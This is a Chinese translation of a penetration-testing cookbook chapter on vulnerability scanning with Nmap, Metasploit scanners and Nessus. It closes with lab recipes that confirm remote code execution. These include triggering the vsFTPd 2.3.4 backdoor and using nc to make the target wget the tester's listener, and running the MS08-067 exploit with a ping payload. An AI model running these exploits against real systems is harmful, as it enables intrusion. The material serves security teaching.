此外，在某些系统上，访问共享需要有效的凭据，可以使用`smb`库的参数 `smbuser`和`smbpassword`指定。我们对这个漏洞感兴趣的原因是，在实际被利用之前，必须满足多个因素必须。首先，系统必须运行涉及的操作系统之一（XP，Server 03 SP2，Vista，Server 08 或 Windows 7）。第二，它必须缺少 MS10-061 补丁，这个补丁解决了代码执行漏洞。最后，系统上的本地打印共享必须可公开访问。有趣的是，我们可以审计 SMB 远程后台打印处理程序服务，以确定系统是否打补丁，无论系统上是否共享了现有的打印机。正因为如此，对于什么是漏洞系统存在不同的解释。一些漏洞扫描程序会将未修补的系统识别为漏洞，但漏洞不能被实际利用。或者，其他漏洞扫描程序（如 NSE 脚本）将评估所有所需条件，以确定系统是否易受攻击。在提供的示例中，扫描的系统未修补，但它也没有共享远程打印机。看看下面的例子：

```
root@KaliLinux:~# nmap -p 445 172.16.36.225 --script=smb-vuln-ms10-061

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-09 04:19 EDT 
Nmap scan report for 172.16.36.225 
Host is up (0.00036s latency). 
PORT    STATE SERVICE 
445/tcp open  microsoft-ds 
MAC Address: 00:0C:29:18:11:FB (VMware)

Host script results: 
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds 
```

在提供的示例中，Nmap 已确定系统不易受攻击，因为它没有共享远程打印机。尽管确实无法利用此漏洞，但有些人仍然声称该漏洞仍然存在，因为系统未修补，并且可以在管理员决定从该设备共享打印机的情况下利用此漏洞。这就是必须评估所有漏洞扫描程序的结果的原因，以便完全了解其结果。一些扫描其仅选择评估有限的条件，而其他扫描其更彻底。这里很难判断最好的答案是什么。大多数渗透测试人员可能更喜欢被告知系统由于环境变量而不易受到攻击，因此他们不会花费无数小时来试图利用不能利用的漏洞。或者，系统管理员可能更喜欢知道系统缺少 MS10-061 补丁，以便系统可以完全安全，即使在现有条件下不能利用漏洞。

### 工作原理

大多数漏洞扫描程序通过评估多个不同的响应，来尝试确定系统是否容易受特定攻击。 在一些情况下，漏洞扫描可以简化为与远程服务建立 TCP 连接，并且通过自开放的特征来识别已知的漏洞版本。 在其他情况下，可以向远程服务发送一系列复杂的特定的探测请求，来试图请求对服务唯一的响应，该服务易受特定的攻击。 在 NSE 漏洞脚本的示例中，如果激活了`unsafe`参数，漏洞扫描实际上将尝试利用此漏洞。

## 5.2 MSF 辅助模块漏洞扫描

与 NSE 中提供的漏洞扫描脚本类似，Metasploit 还提供了一些有用的漏洞扫描程序。 类似于 Nmap 的脚本，大多数是相当有针对性的，用于扫描特定的服务。

### 准备

要使用 MSF 辅助模块执行漏洞分析，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，会使用存在 SMB 服务漏洞的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章“安装 Windows Server”秘籍。

有多种不同的方法可以用于确定 Metasploit 中的漏洞扫描辅助模块。 一种有效的方法是浏览辅助扫描器目录，因为这是最常见的漏洞识别脚本所在的位置。 看看下面的例子：

```
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/scanner/
mysql# cat mysql_authbypass_hashdump.rb | more 
## 
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit 
# web site for more information on licensing and terms of use. 
#   http://metasploit.com/ 
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL  
  include Msf::Auxiliary::Report
  
  include Msf::Auxiliary::Scanner

  def initialize    
      super(      
          'Name'           => 'MySQL Authentication Bypass Password Dump',      
          'Description'    => %Q{          
              This module exploits a password bypass vulnerability in MySQL in order to extract the usernames and encrypted password hashes from a MySQL server. These hashes are stored as loot for later cracking. 
```

这些脚本的布局是相当标准化的，任何给定脚本的描述可以通过使用`cat`命令，然后将输出`pipe`到`more`，从上到下阅读脚本来确定。 在提供的示例中，我们可以看到该脚本测试了 MySQL 数据库服务中存在的身份验证绕过漏洞。 或者，可以在 MSF 控制台界面中搜索漏洞识别模块。 要打开它，应该使用`msfconsole`命令。 搜索命令之后可以与服务相关的特定关键字一同使用，或者可以使用`scanner`关键字查询辅助/扫描器目录中的所有脚本，像这样：

```
msf > search scanner

Matching Modules 
================
   Name                                                                 
   Disclosure Date  Rank    Description   ----                                                                     ---------------  ----    ----------   
   auxiliary/admin/smb/check_dir_file                                                        normal  SMB Scanner Check File/Directory Utility   
   auxiliary/bnat/bnat_scan                                                                  normal  BNAT Scanner
   auxiliary/gather/citrix_published_applications                                            normal  Citrix MetaFrame ICA Published Applications Scanner   
   auxiliary/gather/enum_dns                                                                 normal  DNS Record Scanner and Enumerator    
   auxiliary/gather/natpmp_external_address                                                  normal  NAT-PMP External Address Scanner   
   auxiliary/scanner/afp/afp_login                                                           normal  Apple Filing Protocol Login Utility   
   auxiliary/scanner/afp/afp_server_info                                                     normal  Apple Filing Protocol Info Enumerator   
   auxiliary/scanner/backdoor/energizer_duo_detect                                           normal  Energizer DUO Trojan Scanner   
   auxiliary/scanner/db2/db2_auth                                                            normal  DB2 Authentication Brute Force Utility
```

在识别看起来有希望的脚本时，可以使用`use`命令结合相对路径来激活该脚本。 一旦激活，以下`info`命令可用于读取有关脚本的其他详细信息，包括详细信息，描述，选项和引用：

```
msf > use auxiliary/scanner/rdp/ms12_020_check 
msf  auxiliary(ms12_020_check) > info

       Name: MS12-020 Microsoft Remote Desktop Checker     
       Module: auxiliary/scanner/rdp/ms12_020_check    
       Version: 0    
       License: Metasploit Framework License (BSD)       
       Rank: Normal
       
Provided by:  
    Royce Davis @R3dy_ <rdavis@accuvant.com>  
    Brandon McCann @zeknox <bmccann@accuvant.com>

Basic options:  
    Name     Current Setting  Required  Description  
    ----     ---------------  --------  ----------  RHOSTS                    yes       The target address range or CIDR identifier  
    RPORT    3389             yes       Remote port running RDP  
    THREADS  1                yes       The number of concurrent threads

Description:  
    This module checks a range of hosts for the MS12-020 vulnerability.   
    This does not cause a DoS on the target.
```

一旦选择了模块，`show options`命令可用于识别和/或修改扫描配置。 此命令将显示四个列标题，包括`Name`, `Current Setting`, `Required`, 和`Description`。 `Name`列标识每个可配置变量的名称。 `Current Setting`列列出任何给定变量的现有配置。 `Required`列标识任何给定变量是否需要值。 `Description`列描述每个变量的函数。 可以通过使用`set`命令并提供新值作为参数，来更改任何给定变量的值，如下所示：

```
msf  auxiliary(ms12_020_check) > set RHOSTS 172.16.36.225 
RHOSTS => 172.16.36.225 
msf  auxiliary(ms12_020_check) > run

[*] Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed In this particular case, the system was not found to be vulnerable. However, in the case that a vulnerable system is identified, there is a corresponding exploitation module that can be used to actually cause a denial-of-service on the vulnerable system. This can be seen in the example provided:

msf  auxiliary(ms12_020_check) > use auxiliary/dos/windows/rdp/ms12_020_ maxchannelids 
msf  auxiliary(ms12_020_maxchannelids) > info
       
       Name: MS12-020 Microsoft Remote Desktop Use-After-Free DoS     Module: auxiliary/dos/windows/rdp/ms12_020_maxchannelids    
       Version: 0    
       License: Metasploit Framework License (BSD)       
       Rank: Normal
       
Provided by:  
    Luigi Auriemma  Daniel Godas-Lopez  
    Alex Ionescu  jduck <jduck@metasploit.com>  #ms12-020
    
Basic options:  
    Name   Current Setting  Required  Description  
    ----   ---------------  --------  ----------  
    RHOST                   yes       The target address  
    RPORT  3389             yes       The target port

Description:  
    This module exploits the MS12-020 RDP vulnerability originally discovered and reported by Luigi Auriemma. 
    The flaw can be found in the way the T.125 ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result an invalid pointer being used, therefore causing a denial-of-service condition.

```

### 工作原理

大多数漏洞扫描程序会通过评估多个不同的响应来尝试确定系统是否容易受特定攻击。 一些情况下，漏洞扫描可以简化为与远程服务建立 TCP 连接并且通过自我公开的特征，识别已知的漏洞版本。 在其他情况下，可以向远程服务发送一系列复杂的特定的探测请求，来试图请求对服务唯一的响应，该服务易受特定的攻击。 在前面的例子中，脚本的作者很可能找到了一种方法来请求唯一的响应，该响应只能由修补过或没有修补过的系统生成，然后用作确定任何给定的是否可利用的基础。

## 5.3 使用 Nessus 创建扫描策略

Nessus 是最强大而全面的漏洞扫描器之一。 通过定位一个系统或一组系统，Nessus 将自动扫描所有可识别服务的大量漏洞。 可以在 Nessus 中构建扫描策略，以更精确地定义 Nessus 测试的漏洞类型和执行的扫描类型。 这个秘籍展示了如何在 Nessus 中配置唯一的扫描策略。

### 准备

要在 Nessus 中配置扫描策略，必须首先在 Kali Linux 渗透测试平台上安装 Nessus 的功能副本。 因为 Nessus 是一个需要许可的产品，它不会在 Kali 默认安装。 有关如何在 Kali 中安装 Nessus 的更多信息，请参阅第一章中的“Nessus 安装”秘籍。

### 操作步骤

要在 Nessus 中配置新的扫描策略，首先需要访问 Nessus Web 界面：`https：// localhost：8834`或`https://127.0.0.1:8834`。或者，如果你不从运行 Nessus 的相同系统访问 Web 界面，则应指定相应的 IP 地址或主机名。加载 Web 界面后，你需要使用在安装过程中配置的帐户或安装后构建的其他帐户登录。登录后，应选择页面顶部的`Policy`选项卡。如果没有配置其他策略，您将看到一个空列表和一个`New Policy`按钮。点击该按钮来开始构建第一个扫描策略。

单击`New Policy`后，`Policy Wizard`屏幕将弹出一些预配置的扫描模板，可用于加快创建扫描策略的过程。如下面的屏幕截图所示，每个模板都包含一个名称，然后简要描述其预期功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-3-1.jpg)


在大多数情况下，这些预配置的扫描配置文件中，至少一个与你尝试完成的配置相似。 可能所有这些中最常用的是` Basic Network Scan`。 要记住，选择任何一个选项后，仍然可以修改现有配置的每个详细信息。 它们只是在那里，让你更快开始。 或者，如果你不想使用任何现有模板，您可以向下滚动并选择`Advanced Policy`选项，这会让你从头开始。

如果选择任何一个预配置的模板，您可以通过三步快速的过程来完成扫描配置。 该过程分为以下步骤：

1.  步骤 1 允许您配置基本详细信息，包括配置文件名称，描述和可见性（公共或私有）。 公开的个人资料将对所有 Nessus 用户可见，而私人个人只有创建它的用户才能看到。 

2.  步骤 2 将简单地询问扫描是内部扫描还是外部扫描。 外部扫描将是针对可公共访问的主机执行的，通常位于企业网络的 DMZ 中。 外部扫描不要求你处于同一网络，但可以在 Internet 上执行。 或者，从网络内执行内部扫描，并且需要直接访问扫描目标的 LAN。 

3.  步骤 3，最后一步，使用 SSH 或 Windows 身份验证请求扫描设备的身份验证凭据。 完成后，访问`Profiles`选项卡时，可以在先前为空的列表中看到新的配置文件。 像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-3-2.jpg)

这种方法可以快速方便地创建新的扫描配置文件，但不能完全控制测试的漏洞和执行的扫描类型。 要修改更详细的配置，请单击新创建的策略名称，然后单击`Advanced Mode`链接。 此配置模式下的选项非常全面和具体。 可以在屏幕左侧访问四个不同的菜单，这包括：


` General Settings`（常规设置）：此菜单提供基本配置，定义如何执行发现和服务枚举的详细端口扫描选项，以及定义有关速度，节流，并行性等策略的性能选项。 

`Credentials`（凭证）：此菜单可以配置 Windows，SSH，Kerberos 凭据，甚至一些明文协议选项（不推荐）。

`Plugins`（插件）：此菜单提供对 Nessus 插件的极其精细的控制。 “插件”是 Nessus 中用于执行特定审计或漏洞检查的项目。 你可以根据功能类型启用或禁用审计组，或者逐个操作特定的插件。 

`Preferences`（首选项）：此菜单涵盖了 Nessus 所有操作功能的更模糊的配置，例如 HTTP 身份验证，爆破设置和数据库交互。

### 工作原理

扫描策略定义了 Nessus 所使用的值，它定义了如何运行扫描。 这些扫描策略像完成简单扫描向导设置所需的三个步骤一样简单，或者像定义每个独特插件并应用自定义认证和操作配置一样复杂。

## 5.4 Nessus 漏洞扫描

Nessus 是最强大和全面的漏洞扫描器之一。 通过定位一个系统或一组系统，Nessus 能够自动扫描所有可识别服务的大量漏洞。 一旦配置了扫描策略来定义 Nessus 扫描器的配置，扫描策略可用于对远程目标执行扫描并进行评估。这个秘籍将展示如何使用 Nessus 执行漏洞扫描。

### 准备

要在 Nessus 中配置扫描策略，必须首先在 Kali Linux 渗透测试平台上安装 Nessus 的功能副本。 因为 Nessus 是一个需要许可的产品，它不会在 Kali 默认安装。 有关如何在 Kali 中安装 Nessus 的更多信息，请参阅第一章中的“Nessus 安装”秘籍。

此外，在使用 Nessus 扫描之前，需要创建至少一个扫描策略。 有关在 Nessus 中创建扫描策略的更多信息，请参阅上一个秘籍。

### 操作步骤

要在 Nessus 中开始新的扫描，您需要确保在屏幕顶部选择了`Scans `选项卡。 如果过去没有运行扫描，则会在屏幕中央生成一个空列表。 要执行第一次扫描，您需要单击屏幕左侧的蓝色`New Scan `按钮，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-1.jpg)

这需要一些基本的配置信息。系统将提示你输入一系列字段，包括`Name`, `Policy`, `Folder`, 和 `Targets`。`Name`字段仅用作唯一标识符，以将扫描结果与其他扫描区分开。如果要执行大量扫描，则有必要非常明确扫描名称。第二个字段是真正定义扫描的所有细节。此字段允许你选择要使用的扫描策略。如果你不熟悉扫描策略的工作原理，请参阅本书中的上一个秘籍。登录用户创建的任何公共或私有扫描策略都应在`Policy `下拉菜单中显示。 ` Folder`字段定义将放置扫描结果的文件夹。当你需要对大量扫描结果进行排序时，在文件夹中组织扫描会很有帮助。可以通过单击`New Folder`从`Scans `主菜单创建新的扫描文件夹。最后一个字段是`Targets`。此字段显示如何定义要扫描的系统。在这里，你可以输入单个主机 IP 地址，IP 地址列表，IP 地址的顺序范围，CIDR 范围或 IP 范围列表。或者，你可以使用主机名，假设扫描器能够使用 DNS 正确解析为 IP 地址。最后，还有一个选项用于上传文本文件，它包含任何上述格式的目标列表，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-2.jpg)

配置扫描后，可以使用屏幕底部的`Launch `按钮来执行扫描。 这会立即将扫描添加到扫描列表，并且可以实时查看结果，如以下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-3.jpg)

即使扫描正在运行，你也可以单击扫描名称，并在识别出来时开始查看漏洞。 颜色编码用于快速轻易地识别漏洞的数量及其严重性级别，如以下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-4.jpg)

单击`Example `扫描后，我们可以看到两个正在扫描的主机。 第一个表示扫描完成，第二个主机完成了 2%。 `Vulnerabilities `列中显示的条形图显示与每个给定主机关联的漏洞数量。 或者，可以单击屏幕顶部的`Vulnerabilities `链接，根据发现的漏洞以及确定该漏洞的主机数量来组织结果。 在屏幕的右侧，我们可以看到类似的饼图，但这一个对应于所有扫描的主机，如以下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-5.jpg)

此饼图还清晰定义每种颜色的含义，从关键漏洞到详细信息。 通过选择任何特定主机 IP 地址的链接，你可以看到识别为该主机的特定漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-6.jpg)

此漏洞列表标识插件名称，通常会给出发现和严重性级别的简要说明。 作为渗透测试程序，如果你要在目标系统上实现远程代码执行，关键和高漏洞通常是最有希望的。 通过单击任何一个特定漏洞，你可以获得该漏洞的大量详细信息，如以下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/5-4-7.jpg)


除了描述和修补信息之外，该页面还将为进一步研究提供替代来源，最重要的是（对于渗透测试人员）显示是否存在漏洞。 此页面通常还会表明可用的利用是否是公开的利用，或者是否存在于利用框架（如 Metasploit，CANVAS 或 Core Impact）中。

### 工作原理

大多数漏洞扫描程序会通过评估多个不同的响应来尝试确定系统是否容易受特定攻击。 一些情况下，漏洞扫描可以简化为与远程服务建立 TCP 连接并且通过自我公开的特征，识别已知的漏洞版本。 在其他情况下，可以向远程服务发送一系列复杂的特定的探测请求，来试图请求对服务唯一的响应，该服务易受特定的攻击。 Nessus 同时执行大量测试，来试图为给定目标生成完整的攻击面图像。

## 5.5 Nessuscmd 命令行扫描

Nessuscmd 是 Nessus 中的命令行工具。 如果你希望将 Nessus 插件扫描集成到脚本，或重新评估先前发现的漏洞，Nessuscmd 可能非常有用。

### 准备

要在 Nessus 中配置扫描策略，必须首先在 Kali Linux 渗透测试平台上安装 Nessus 的功能副本。 因为 Nessus 是一个需要许可的产品，它不会在 Kali 默认安装。 有关如何在 Kali 中安装 Nessus 的更多信息，请参阅第一章中的“Nessus 安装”秘籍。

### 操作步骤

你需要切换到包含 nessuscmd 脚本的目录来开始。 然后，通过不提供任何参数来执行脚本，你可以查看包含相应用法和可用选项的输出，如下所示：

```
root@KaliLinux:~# cd /opt/nessus/bin/ 
root@KaliLinux:/opt/nessus/bin# ./nessuscmd 
Error - no target specified 
nessuscmd (Nessus) 5.2.5 [build N25109] 
Copyright (C) 1998 - 2014 Tenable Network Security, Inc
Usage: 
nessuscmd <option> target... 
```

为了使用已知的 Nessus 插件 ID 对远程主机执行 nessuscmd 扫描，必须使用`-i`参数，并提供所需的插件 ID 的值。 出于演示目的，我们使用知名的 MS08-067 漏洞的插件 ID 执行扫描，如下所示：

```
root@KaliLinux:/opt/nessus/bin# ./nessuscmd -i 34477 172.16.36.135 
Starting nessuscmd 5.2.5 
Scanning '172.16.36.135'...

+ Host 172.16.36.135 is up 
```

第一次扫描在不容易受到指定插件测试的漏洞攻击的主机上执行。 输出显式主机已启动，但未提供其他输出。 或者，如果系统存在漏洞，会返回对应这个插件的输出，像这样：

```
root@KaliLinux:/opt/nessus/bin# ./nessuscmd -i 34477 172.16.36.225 
Starting nessuscmd 5.2.5 
Scanning '172.16.36.225'...

+ Results found on 172.16.36.225 :
   - Port microsoft-ds (445/tcp)     
    [!] Plugin ID 34477      
     |       
     | Synopsis :      
     |       
     |       
     | Arbitrary code can be executed on the remote host due to a flaw      
     | in the      
     | 'Server' service.      
     |       
     | Description :      
     |       
     |       
     | The remote host is vulnerable to a buffer overrun in the 'Server'      
     | service that may allow an attacker to execute arbitrary code on
     | the      
     | remote host with the 'System' privileges.      
     | See also :   
     |    
     |    
     | http://technet.microsoft.com/en-us/security/bulletin/ms08-067    
     |    
     |    
     |    
     | Solution :   
     |
     | Microsoft has released a set of patches for Windows 2000, XP, 2003,    
     | Vista and 2008.  
     |     
     | Risk factor :  
     |     
     |    
     | Critical / CVSS Base Score : 10.0 
     | (CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C)   
     | CVSS Temporal Score : 8.7   
     | (CVSS2#E:H/RL:OF/RC:C)   
     | Public Exploit Available : true
```

### 工作原理

大多数漏洞扫描程序会通过评估多个不同的响应来尝试确定系统是否容易受特定攻击。 一些情况下，漏洞扫描可以简化为与远程服务建立 TCP 连接并且通过自我公开的特征，识别已知的漏洞版本。 在其他情况下，可以向远程服务发送一系列复杂的特定的探测请求，来试图请求对服务唯一的响应，该服务易受特定的攻击。Nessuscmd 执行相同的测试，或者由常规 Nessus 接口，给定一个特定的插件 ID 来执行。 唯一的区别是执行漏洞扫描的方式。

## 5.6 使用 HTTP 交互来验证漏洞

作为渗透测试者，任何给定漏洞的最佳结果是实现远程代码执行。 但是，在某些情况下，我们可能只想确定远程代码执行漏洞是否可利用，但不想实际遵循整个利用和后续利用过程。 执行此操作的一种方法是创建一个 Web 服务器，该服务器将记录交互并使用给定的利用来执行将代码，使远程主机与 Web 服务器交互。 此秘籍战死了如何编写自定义脚本，用于使用 HTTP 流量验证远程代码执行漏洞。

### 准备

要使用 HTTP 交互验证漏洞，你需要一个运行拥有远程代码执行漏洞的软件的系统。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

在实际利用给定的漏洞之前，我们必须部署一个 Web 服务器，它会记录与它的交互。 这可以通过一个简单的 Python 脚本来完成，如下所示：

```py
#!/usr/bin/python

import socket

print "Awaiting connection...\n"

httprecv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
httprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
httprecv.bind(("0.0.0.0",8000)) 
httprecv.listen(2)

(client, ( ip,sock)) = httprecv.accept() 
print "Received connection from : ", ip 
data = client.recv(4096) 
print str(data)

client.close() 
httprecv.close()
```

这个 Python 脚本使用套接字库来生成一个 Web 服务器，该服务器监听所有本地接口的 TCP 8000 端口。 接收到来自客户端的连接时，脚本将返回客户端的 IP 地址和发送的请求。 为了使用此脚本验证漏洞，我们需要执行代码，使远程系统与托管的 Web 服务进行交互。 但在这之前，我们需要使用以下命令启动我们的脚本：

```
root@KaliLinux:~# ./httprecv.py 
Awaiting connection... 
```

接下来，我们需要利用导致远程代码执行的漏洞。 通过检查 Metasploitable2 盒子内的 Nessus 扫描结果，我们可以看到运行的 FTP 服务有一个后门，可以通过提供带有笑脸的用户名来触发。 没有开玩笑......这实际上包含在 FTP 生产服务中。 为了尝试利用它，我们将首先使用适当的用户名连接到服务，如下所示：

```
root@KaliLinux:~# ftp 172.16.36.135 21 
Connected to 172.16.36.135. 
220 (vsFTPd 2.3.4) 
Name (172.16.36.135:root): Hutch:) 
331 Please specify the password. 
Password: 
^C 
421 Service not available, remote server has closed connection 
```

尝试连接到包含笑脸的用户名后，后门应该在远程主机的 TCP 端口 6200 上打开。我们甚至不需要输入密码。 反之，`Ctrl + C`可用于退出 FTP 客户端，然后可以使用 Netcat 连接到打开的后门，如下所示：

```
root@KaliLinux:~# nc 172.16.36.135 6200 
wget http://172.16.36.224:8000 
--04:18:18--  http://172.16.36.224:8000/
           => `index.html' 
Connecting to 172.16.36.224:8000... connected. 
HTTP request sent, awaiting response... No data received. 
Retrying.

--04:18:19--  http://172.16.36.224:8000/  
  (try: 2) => `index.html' 
Connecting to 172.16.36.224:8000... failed: Connection refused. 
^C
```

与开放端口建立 TCP 连接后，我们可以使用我们的脚本来验证，我们是否可以进行远程代码执行。 为此，我们尝试以 HTTP 检测服务器的 URL 使用`wget`。 尝试执行此代码后，我们可以通过查看脚本输出来验证是否收到了 HTTP 请求：

```
root@KaliLinux:~# ./httprecv.py 
Received connection from :  172.16.36.135 
GET / HTTP/1.0 
User-Agent: Wget/1.10.2 
Accept: */* 
Host: 172.16.36.224:8000 
Connection: Keep-Alive
```

### 工作原理

此脚本的原理是识别来自远程主机的连接尝试。 执行代码会导致远程系统连接回我们的监听服务器，我们可以通过利用特定的漏洞来验证远程代码执行是否存在。 在远程服务器未安装`wget`或`curl`的情况下，可能需要采用另一种手段来识别远程代码执行。

## 5.7 使用 ICMP 交互来验证漏洞

作为渗透测试者，任何给定漏洞的最佳结果是实现远程代码执行。 但是，在某些情况下，我们可能只想确定远程代码执行漏洞是否可利用，但不想实际遵循整个利用和后续利用过程。 一种方法是运行一个脚本，记录 ICMP 流量，然后在远程系统上执行 ping 命令。 该秘籍演示了如何编写自定义脚本，用于使用 ICMP 流量验证远程代码执行漏洞。

### 准备

要使用 ICMP 交互验证漏洞，你需要一个运行拥有远程代码执行漏洞的软件的系统。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

在实际利用给定漏洞之前，我们必须部署一个脚本，来记录传入的 ICMP 流量。 这可以通过使用 Scapy 的简单 Python 脚本完成，如下所示：

```py
#!/usr/bin/python

import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *

def rules(pkt):   
    try:      
        if (pkt[IP].dst=="172.16.36.224") and (pkt[ICMP]):
            print str(pkt[IP].src) + " is exploitable"  
    except:    
        pass

print "Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening"
         
sniff(lfilter=rules,store=0) 
```

这个 Python 脚本监听所有传入的流量，并将发往扫描系统的任何 ICMP 流量的源标记为存在漏洞。 为了使用此脚本验证漏洞是否能够利用，我们需要执行代码，使远程系统`ping`我们的扫描系统。 为了演示这一点，我们可以使用 Metasploit 来利用远程代码执行漏洞。 但在这之前，我们需要启动我们的脚本，如下：

```
root@KaliLinux:~# ./listener.py 
Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening 
```

接下来，我们需要利用导致远程代码执行的漏洞。 通过检查 Windows XP 框的 Nessus 扫描结果，我们可以看到系统容易受到 MS08-067 漏洞的攻击。 为了验证这一点，我们使用执行`ping`命令的载荷，使其`ping`我们的扫描系统来利用漏洞，如下所示：

```
msf > use exploit/windows/smb/ms08_067_netapi 
msf  exploit(ms08_067_netapi) > set PAYLOAD windows/exec 
PAYLOAD => windows/exec 
msf  exploit(ms08_067_netapi) > set RHOST 172.16.36.225 
RHOST => 172.16.36.225 
msf  exploit(ms08_067_netapi) > set CMD cmd /c ping 172.16.36.224 -n 1
CMD => cmd /c ping 172.16.36.224 -n 1 
msf  exploit(ms08_067_netapi) > exploit

[*] Automatically detecting the target... 
[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
[*] Attempting to trigger the vulnerability... 
```

Metasploit 中的利用配置为使用`windows / exec`载荷，它在被利用系统中执行代码。 此载荷配置为向我们的扫描系统发送单个 ICMP 回显请求。 执行后，我们可以通过查看仍在监听的原始脚本来确认漏洞利用是否成功，如下所示：

```
root@KaliLinux:~# ./listener.py 
Listening for Incoming ICMP Traffic.  Use Ctrl+C to stop listening 
172.16.36.225 is exploitable
```

### 工作原理


此脚本的原理是监听来自远程主机的传入的 ICMP 流量。 通过执行代码，使远程系统向我们的监听服务器发送回显请求，我们可以通过利用特定的漏洞来验证远程代码执行是否可以利用。
